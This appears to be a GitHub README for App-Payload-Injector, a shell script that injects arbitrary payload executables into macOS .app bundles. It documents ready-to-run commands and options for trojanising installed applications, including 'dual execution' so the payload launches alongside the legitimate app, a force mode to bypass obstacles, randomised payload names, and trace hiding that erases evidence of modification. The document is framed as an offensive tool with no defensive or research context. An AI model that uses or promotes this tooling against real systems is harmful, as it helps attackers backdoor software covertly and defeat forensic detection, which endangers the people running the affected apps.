# App-Payload-Injector

A script used to inject executables into OSX .app files.

Keep in mind that some applications are write restricted and will therefore require escalated privileges for this script to work.
## Usage
For this script to work it needs a minimum of two arguments. One specifying what app to target and one specifying what payload to use.
<br><br>
An exeample of this minimum viable call would be the following:`./AppPayloadInjector.sh -t=/tmp/Someapp.app -p="/path with/space/payload.sh"`

## Arguments
### Target
#### -t or --target
#### Requires a parameter
#### This argument is required.
<br>This option chooses what app to target.<br><br>
Example: `./AppPayloadInjector.sh -t="$HOME/Desktop/myapp.app"`
<br><br><br>

### Payload
#### -p or --payload
#### Requires a parameter
#### This argument is required.
<br>This option chooses what payload to use.<br><br>
Example: `./AppPayloadInjector.sh -t="$HOME/Desktop/myapp.app" -p="/tmp/payload.sh"`
<br><br><br>

### Nohide
#### -nohide
<br>Disables trace hiding. This script attempts to remove any trace that some file(s) has been modified before finishing.<br><br>
Example: `./AppPayloadInjector.sh -t="$HOME/Desktop/myapp.app" -p="/tmp/payload.sh" -nohide`
<br><br><br>

### Force
#### -f or --force
<br>Attempts to bypass any obstacles if found.<br><br>
Example: `./AppPayloadInjector.sh -t="$HOME/Desktop/myapp.app" -p="/tmp/payload.sh" -f`
<br><br><br>

### Payloadname
#### -pn or --payloadname
#### Requires a parameter
<br>Sets the name of the dropped payload. If not set, generates a random name.<br><br>
Example: `./AppPayloadInjector.sh -t="$HOME/Desktop/myapp.app" -p="/tmp/payload.sh" -pn="Payload"`
<br><br><br>

### Payloadpermission
#### -pp or --payloadpermission
#### Requires a parameter
<br>Sets the permission of the payload once dropped. If not set, uses same permission as original executable.<br><br>
Example: `./AppPayloadInjector.sh -t="$HOME/Desktop/myapp.app" -p="/tmp/payload.sh" -pp="u-r"`
<br><br><br>

### Dualexecute
#### -de or --dualexecute
<br>Enables dual execution causing both the specified payload and the app to launch on application init.<br><br>
Example: `./AppPayloadInjector.sh -t="$HOME/Desktop/myapp.app" -p="/tmp/payload.sh" -de`
<br><br><br>

### Dualexecutename
#### -den or --dualexecutename
#### Requires a parameter
<br>Sets the name of the dropped launcher allowing for dual execution.<br><br>
Example: `./AppPayloadInjector.sh -t="$HOME/Desktop/myapp.app" -p="/tmp/payload.sh" -den="launcher"`
<br><br><br>


# Examples 


Injecting a shell script.

`./AppPayloadInjector.sh -t="/Applications/App.app" -p="~/Desktop/Shell.sh"`
<br><br>
Injecting a shell script and naming payload to "Example".

`./AppPayloadInjector.sh -t="/Applications/App.app" -p"~/Desktop/Shell.sh" -pn="Example"`
<br><br>
Force injecting a shell script, enabling dual execution and naming dual execution launcher to "launcher".

`./AppPayloadInjector.sh -t="/Applications/App.app" -p"~/Desktop/Shell.sh" -f -de -den="laucnher"`
<br><br>
